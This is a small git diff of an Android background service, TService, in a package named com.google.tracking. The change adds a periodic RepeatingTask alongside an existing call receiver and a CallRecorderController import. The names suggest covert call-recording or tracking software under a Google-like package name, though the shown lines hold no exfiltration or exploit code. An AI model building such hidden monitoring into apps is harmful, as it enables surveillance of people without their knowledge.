@@ -10,6 +10,8 @@ import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import com.google.tracking.call.CallRecorderController;
+import com.google.tracking.constants.TrackingConstants;
+import com.google.tracking.runnable.RepeatingTask;
 
 
 public class TService extends Service {
@@ -54,6 +56,8 @@ public class TService extends Service {
         filter.addAction(ACTION_IN);
         this.callReceiver = new CallReceiver();
         this.registerReceiver(this.callReceiver, filter);
+
+        new RepeatingTask(TrackingConstants.RUN_REPEATING_TASK_INTERVAL);
 
         // if(terminate != null) {
         // stopSelf();
